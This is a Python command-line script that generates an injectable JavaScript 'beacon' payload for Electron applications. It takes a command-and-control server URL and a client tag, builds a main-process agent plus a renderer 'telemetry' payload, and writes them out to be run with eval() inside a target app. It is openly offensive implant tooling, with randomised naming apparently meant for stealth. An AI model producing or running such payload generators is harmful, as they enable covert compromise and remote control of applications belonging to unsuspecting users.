#!/usr/bin/env python3
"""
Generate a ready-to-eval Atom Beacon payload for runtime injection.

Outputs a single self-contained JavaScript IIFE that includes both the
main-process agent and the renderer telemetry payload (embedded as a string).
Feed the output to eval() in an Electron main process context.

Usage:
    python3 generate_payload.py --server https://10.0.0.1:8444
    python3 generate_payload.py --server https://10.0.0.1:8444 --tag signal -o payload.js
"""

import argparse
import sys
import os

# Reuse atomize's generate_bootstrap
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from atomize import generate_bootstrap


def main():
    parser = argparse.ArgumentParser(
        description='Generate a ready-to-eval Atom Beacon payload'
    )
    parser.add_argument('--server', required=True, help='C2 server URL')
    parser.add_argument('--tag', default='atom', help='Client tag (default: atom)')
    parser.add_argument('-o', '--output', help='Output file (default: stdout)')

    args = parser.parse_args()

    payload = generate_bootstrap(args.server, args.tag, '__ax' + os.urandom(4).hex())

    if args.output:
        with open(args.output, 'w') as f:
            f.write(payload)
        print(f"Payload written to {args.output} ({len(payload)} bytes)", file=sys.stderr)
    else:
        sys.stdout.write(payload)


if __name__ == '__main__':
    main()
